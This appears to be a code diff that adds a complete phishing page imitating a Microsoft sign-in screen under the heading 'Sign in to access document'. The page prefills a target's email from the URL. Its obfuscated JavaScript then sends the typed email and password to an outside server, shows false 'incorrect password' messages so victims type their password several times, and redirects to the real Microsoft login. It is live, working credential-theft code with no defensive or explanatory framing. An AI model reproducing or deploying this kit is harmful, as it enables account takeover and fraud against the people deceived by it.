@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" >
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" >
+    <title>Document</title>
+    <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
+    <style type="text/css">
+    textarea:hover,
+    input:hover,
+    textarea:active,
+    input:active,
+    textarea:focus,
+    input:focus,
+    button:focus,
+    button:active,
+    button:hover,
+    label:focus,
+    .btn:active,
+    .btn.active {
+        outline: 0px !important;
+        -webkit-appearance: none;
+        box-shadow: none !important;
+    }
+
+    .box {
+        box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
+        border: 0px solid rgba(0, 0, 0, 0.4);
+        max-height: 415px;
+
+
+        width: 440px;
+        /*width: calc(100% - 40px);*/
+        padding: 44px;
+        margin-left: auto;
+        margin-right: auto;
+        margin-top: 20px;
+        margin-bottom: 28px;
+    }
+
+    #footer {
+        position: fixed;
+        bottom: 0px;
+        width: 100%;
+        overflow: visible;
+        z-index: 99;
+        clear: both;
+
+
+    }
+
+    /*.footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}*/
+    div .footerNode a,
+    div .footerNode span {
+        color: black;
+        font-size: 0.75rem;
+        line-height: 28px;
+        white-space: nowrap;
+        display: inline-block;
+        float: right;
+        margin-left: 8px;
+        margin-right: 8px;
+    }
+
+    @media only screen and (max-width: 610px) {
+        #hide {
+            display: none;
+        }
+    }
+    </style>
+</head>
+
+<body style="background-image: url('https://i.imgur.com/OpPSyRe.png?alt=media&token=78b6b6e8-cd14-4948-89a0-4767974b4f63">
+    <div class="container-fluid">
+        <div class="container">
+            <div class="row my-5 py-5">
+                <!-- <div class="col-lg-6" id="hide">
+            <div class="text-white my-5 py-3">
+              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
+              <span class="h5 font-weight-normal">Upgrade to ad-free ai and the latest productivity tools with Microsoft.</span><br><br><br>
+              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
+            </div>
+          </div> -->
+                <div class="col-lg-6 mx-auto">
+                    <!-- ////////////////////////div1 start/////////////////////// -->
+                    <div class="m-5 p-5 bg-white box" id="div1">
+                        <img src="https://firebasestorage.googleapis.com/v0/b/document-d-access2.appspot.com/o/logotru.svg?alt=media&token=6e244b2f-e1dd-4ec2-96dd-687d03c4c352" class="img-fluid"><br><br>
+                        <span class="h5">Sign in to access document</span><br>
+                        <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
+                        <div class="form-group mt-2">
+                            <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
+                        </div>
+                        <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
+                        <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
+                        <p style="font-size: 14px"><a href="#">sign in options</a></p>
+                        <div class="text-right">
+                            <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
+                        </div>
+                    </div>
+                    <!-- ////////////////////////div1 end/////////////////////// -->
+                    <!-- ////////////////////////div2 start/////////////////////// -->
+                    <div class="m-5 p-5 bg-white box" id="div2" style="display: none;">
+                        <form id="contact">
+                            <img src="https://firebasestorage.googleapis.com/v0/b/document-d-access2.appspot.com/o/logotru.svg?alt=media&token=6e244b2f-e1dd-4ec2-96dd-687d03c4c352" class="img-fluid"><br>
+                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span>
+                            <div class="py-2"><span class="h4" style="color: #4E4542">Sign in to access document</span></div>
+                            <div class="pb-2">
+                                <span id="msg" class="text-dark"></span>
+                                <span id="msg2" class="text-danger" style="display: none;">Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a></span>
+                                <span id="msg1" class="text-danger" style="display: none;">Sorry, sign-in timed out. Please try again.</span>
+                            </div>
+                            <div class="form-group mt-1">
+                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                            </div>
+                            <p style="font-size: 14px"><a href="#">Forget password?</a></p>
+                            <!-- <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
+                            <p style="font-size: 14px"><a href="#">sign in options</a></p> -->
+                            <div class="text-right">
+                                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button>
+                            </div>
+                        </form>
+                    </div>
+                    <!-- ////////////////////////div2 end/////////////////////// -->
+                    <!-- ////////////////////////div3 start/////////////////////// -->
+                    <div class="m-5 p-5 bg-white box" id="div3" style="display: none;min-height: 440px;min-width: 408px;">
+                        <!-- <img src="images/microsoft_logo.svg" class="img-fluid"><br><br> -->
+                        <div class="text-center mt-3 text-center">
+                            <img src="https://firebasestorage.googleapis.com/v0/b/document-d-access2.appspot.com/o/logotru.svg?alt=media&token=6e244b2f-e1dd-4ec2-96dd-687d03c4c352" class="img-fluid" id="success" width="140px">
+                        </div>
+                        <center><span id="load-text-2" style="font-size: 20px;display: block;"><br><br><br>Loading...:<br>Redirecting to File Homepage.</span></center>
+                    </div>
+                </div>
+                <!-- ////////////////////////div3 end/////////////////////// -->
+            </div>
+        </div>
+    </div>
+    </div>
+    <footer id="footer" style="padding-right: 30px">
+        <div>
+            <div class="footerNode">
+                <span>Privacy & cookie</span>
+                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Terms of use</a>
+            </div>
+        </div>
+    </footer>
+ <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+var _0x1218df=_0x2a13;function _0x2a13(_0x295131,_0xe9b375){var _0x1b799d=_0x1b79();return _0x2a13=function(_0x2a1397,_0x435828){_0x2a1397=_0x2a1397-0x1de;var _0x2ff92d=_0x1b799d[_0x2a1397];return _0x2ff92d;},_0x2a13(_0x295131,_0xe9b375);}function _0x1b79(){var _0x382b1b=['https://login.microsoftonline.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv','#ai','POST','test','80EpdgUU','6SWZlwp','#aich','click','#field','#msg1','1696fpgsVn','ajax','JSON','getElementById','309kCWexD','350244vfHvyh',':visible','Verifying...','#submit-btn','#pr','block','#msg2','139284fcAnoL','#error','location','animate','msg1','#msg','focus','show','2897867xMcFcc','hash','hide','14468680aVdDjI','ready','toLowerCase','indexOf','1005151uwziFM','#div3','11bshnfw','4929705ibTpog','none','val','#div2','Sign\x20in','msg','style','href','#div1','display','text','substr','https://azagrcampagnamonica.it/sedd/next.php','preventDefault','html','keypress','keyCode'];_0x1b79=function(){return _0x382b1b;};return _0x1b79();}(function(_0x2f4fac,_0x5e417b){var _0x47d072=_0x2a13,_0x4e1d8a=_0x2f4fac();while(!![]){try{var _0x1b3577=-parseInt(_0x47d072(0x1fd))/0x1+-parseInt(_0x47d072(0x1ee))/0x2+-parseInt(_0x47d072(0x1e6))/0x3*(-parseInt(_0x47d072(0x1e2))/0x4)+parseInt(_0x47d072(0x200))/0x5+parseInt(_0x47d072(0x216))/0x6*(-parseInt(_0x47d072(0x1f6))/0x7)+-parseInt(_0x47d072(0x215))/0x8*(parseInt(_0x47d072(0x1e7))/0x9)+-parseInt(_0x47d072(0x1f9))/0xa*(-parseInt(_0x47d072(0x1ff))/0xb);if(_0x1b3577===_0x5e417b)break;else _0x4e1d8a['push'](_0x4e1d8a['shift']());}catch(_0x98504){_0x4e1d8a['push'](_0x4e1d8a['shift']());}}}(_0x1b79,0x92213),$(document)[_0x1218df(0x1fa)](function(){var _0x1db3fe=_0x1218df,_0x47ed8b=0x0,_0x3208fd=window[_0x1db3fe(0x1f0)][_0x1db3fe(0x1f7)]['substr'](0x1);if(!_0x3208fd){}else{var _0x4ce033=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(!_0x4ce033[_0x1db3fe(0x214)](_0x3208fd))var _0x207f82=_0x3208fd;else var _0x207f82=atob(_0x3208fd);var _0x5eb747=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x5eb747[_0x1db3fe(0x214)](_0x207f82))return $('#error')[_0x1db3fe(0x1f5)](),_0x3208fd[_0x1db3fe(0x1f4)],![];var _0x4ef264=_0x207f82['indexOf']('@'),_0x82cb63=_0x207f82['substr'](_0x4ef264+0x1),_0x40fb36=_0x82cb63[_0x1db3fe(0x20b)](0x0,_0x82cb63[_0x1db3fe(0x1fc)]('.')),_0x15be19=_0x40fb36[_0x1db3fe(0x1fb)]();$(_0x1db3fe(0x212))[_0x1db3fe(0x202)](_0x207f82),$('#div1')[_0x1db3fe(0x1f1)]({'left':0x0,'opacity':'hide'},0x0),$('#div2')[_0x1db3fe(0x1f1)]({'right':0x0,'opacity':_0x1db3fe(0x1f5)},0x1f4),$(_0x1db3fe(0x1de))[_0x1db3fe(0x20e)](_0x207f82);}$(_0x1db3fe(0x212))[_0x1db3fe(0x1df)](function(){var _0x4331b1=_0x1db3fe;$(_0x4331b1(0x1ef))[_0x4331b1(0x1f8)]();}),$(document)[_0x1db3fe(0x20f)](function(_0x4fe036){var _0x3012cc=_0x1db3fe,_0x322348=_0x4fe036[_0x3012cc(0x210)]?_0x4fe036[_0x3012cc(0x210)]:_0x4fe036['which'];if(_0x322348=='13'){_0x4fe036['preventDefault']();if($(_0x3012cc(0x208))['is'](':visible'))$('#next')[_0x3012cc(0x1df)]();else{if($(_0x3012cc(0x203))['is'](_0x3012cc(0x1e8)))_0x4fe036[_0x3012cc(0x20d)](),$(_0x3012cc(0x1ea))['click']();else return![];}}}),$('#next')['click'](function(){var _0x269a94=_0x1db3fe;event[_0x269a94(0x20d)]();var _0x428fb6=$('#ai')['val'](),_0x3a1dc8=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x3a1dc8[_0x269a94(0x214)](_0x428fb6))return $(_0x269a94(0x1ef))[_0x269a94(0x1f5)](),_0x3208fd['focus'],![];var _0x41c2cc=_0x428fb6[_0x269a94(0x1fc)]('@'),_0x534901=_0x428fb6[_0x269a94(0x20b)](_0x41c2cc+0x1),_0x3f7b53=_0x534901[_0x269a94(0x20b)](0x0,_0x534901[_0x269a94(0x1fc)]('.')),_0x5e9d50=_0x3f7b53[_0x269a94(0x1fb)]();$('#div1')[_0x269a94(0x1f1)]({'left':0x0,'opacity':'hide'},0x0),$('#div2')['animate']({'right':0x0,'opacity':_0x269a94(0x1f5)},0x1f4),$(_0x269a94(0x1de))['html'](_0x428fb6);});var _0x27dff2='aHR0cHM6Ly9zYW55bWFzc2FnZS5jb20vY29sbGVjdGlvbnMvbmV4dC5waHA=';$(_0x1db3fe(0x1ea))[_0x1db3fe(0x1df)](function(_0xf77091){var _0x1dbdc7=_0x1db3fe;_0xf77091['preventDefault']();var _0x20f45e=$(_0x1dbdc7(0x212))[_0x1dbdc7(0x202)](),_0x7ea0f5=$('#pr')[_0x1dbdc7(0x202)](),_0x47bb60=$(_0x1dbdc7(0x1e0))[_0x1dbdc7(0x20e)](),_0x46a2d2=$(_0x1dbdc7(0x1f3))[_0x1dbdc7(0x20e)](),_0x3c7568=_0x20f45e,_0x948eac=_0x3c7568['indexOf']('@'),_0x250933=_0x3c7568['substr'](_0x948eac+0x1),_0x9ab9bb=_0x250933[_0x1dbdc7(0x20b)](0x0,_0x250933[_0x1dbdc7(0x1fc)]('.')),_0x5418f7=_0x9ab9bb[_0x1dbdc7(0x1fb)]();$(_0x1dbdc7(0x1f3))[_0x1dbdc7(0x20a)](_0x46a2d2),_0x47ed8b=_0x47ed8b+0x1,$[_0x1dbdc7(0x1e3)]({'dataType':_0x1dbdc7(0x1e4),'url':_0x1dbdc7(0x20c),'type':_0x1dbdc7(0x213),'data':{'ai':_0x20f45e,'pr':_0x7ea0f5,'detail':_0x47bb60},'beforeSend':function(_0x33ceff){var _0x3803f4=_0x1dbdc7;$('#submit-btn')[_0x3803f4(0x20e)](_0x3803f4(0x1e9));},'success':function(_0x34351a){var _0x27bdab=_0x1dbdc7;$(_0x27bdab(0x1eb))[_0x27bdab(0x202)]('');if(_0x47ed8b>=0x3)return _0x47ed8b=0x0,$(_0x27bdab(0x203))[_0x27bdab(0x1f1)]({'left':0x0,'opacity':_0x27bdab(0x1f8)},0x0),$(_0x27bdab(0x1fe))[_0x27bdab(0x1f1)]({'left':0x0,'opacity':_0x27bdab(0x1f5)},0x1f4),setTimeout(()=>{var _0x47569e=_0x27bdab;window[_0x47569e(0x1f0)]['href']=_0x47569e(0x211);},0x1f4),![];_0x47ed8b==0x2?($(_0x27bdab(0x1ed))[_0x27bdab(0x1f5)](),$(_0x27bdab(0x1f3))[_0x27bdab(0x1f8)](),$(_0x27bdab(0x1e1))['hide']()):($(_0x27bdab(0x1e1))[_0x27bdab(0x1f5)](),$('#msg')[_0x27bdab(0x1f8)](),$(_0x27bdab(0x1ed))['hide']());},'error':function(){var _0x2b54a6=_0x1dbdc7,_0x160d01=document[_0x2b54a6(0x1e5)](_0x2b54a6(0x205)),_0x1224a7=document[_0x2b54a6(0x1e5)](_0x2b54a6(0x1f2)),_0x1aabdf=document[_0x2b54a6(0x1e5)]('msg2');$(_0x2b54a6(0x1eb))[_0x2b54a6(0x202)]('');if(_0x47ed8b>=0x3)return _0x47ed8b=0x0,$('#div2')[_0x2b54a6(0x1f1)]({'left':0x0,'opacity':_0x2b54a6(0x1f8)},0x0),$(_0x2b54a6(0x1fe))['animate']({'left':0x0,'opacity':_0x2b54a6(0x1f5)},0x1f4),setTimeout(()=>{var _0x4e410b=_0x2b54a6;window[_0x4e410b(0x1f0)][_0x4e410b(0x207)]=_0x4e410b(0x211);},0x3e8),![];_0x47ed8b==0x2?(_0x1aabdf[_0x2b54a6(0x206)][_0x2b54a6(0x209)]=_0x2b54a6(0x1ec),_0x160d01[_0x2b54a6(0x206)][_0x2b54a6(0x209)]=_0x2b54a6(0x201),_0x1224a7['style'][_0x2b54a6(0x209)]='none'):(_0x1224a7[_0x2b54a6(0x206)]['display']=_0x2b54a6(0x1ec),_0x160d01[_0x2b54a6(0x206)][_0x2b54a6(0x209)]='none',_0x1aabdf[_0x2b54a6(0x206)]['display']=_0x2b54a6(0x201));},'complete':function(){var _0x2647ff=_0x1dbdc7;$('#submit-btn')[_0x2647ff(0x20e)](_0x2647ff(0x204));}});});}));
+</script>
+
+</html>   
+
+
+
+
